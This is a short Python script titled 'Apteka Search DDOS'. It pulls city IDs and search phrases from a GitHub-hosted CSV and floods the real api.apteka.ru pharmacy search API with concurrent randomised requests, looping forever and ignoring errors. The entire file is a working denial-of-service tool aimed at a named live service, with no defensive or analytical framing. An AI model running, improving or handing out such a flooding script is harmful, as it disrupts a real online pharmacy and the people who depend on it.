import aiohttp
import asyncio
import time
import csv
import wget
import random
import argparse


parser = argparse.ArgumentParser(description="Apteka Search DDOS")
parser.add_argument("-t", dest="tasks", required=True, type=int)
args = parser.parse_args()

city_ids_raw = 'https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/city.csv'
phrases_raw = 'https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/word.csv'

city_ids_csv = wget.download(city_ids_raw)
phrases_csv = wget.download(phrases_raw)


def csv_to_list(file):
    l = []
    with open(file) as csv_file:
        csv_reader = csv.reader(csv_file, delimiter=',')
        line_count = 0
        for row in csv_reader:
            if line_count != 0:
                l.append(row[0].replace(' ', ''))
            line_count += 1
    return l


city_ids = csv_to_list(city_ids_csv)
phrases = csv_to_list(phrases_csv)


async def search_apteka(session, c, w, ps, p):
    url = 'https://api.apteka.ru/Search/ByPhrase?pageSize=%s&page=%s&phrase=%s&cityId=%s' % (ps, p, w, c)
    async with session.get(url) as resp:
        apteka = await resp.json()
        print(url)
        return apteka


async def main():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(1, args.tasks):
            tasks.append(asyncio.ensure_future(search_apteka(session, random.choice(city_ids), random.choice(phrases), random.choice(range(25, 50)), random.choice(range(0, 20)))))
        respo = await asyncio.gather(*tasks)


while True:
    try:
        asyncio.run(main())
    except Exception as e:
        print(f'Exception: {e}')
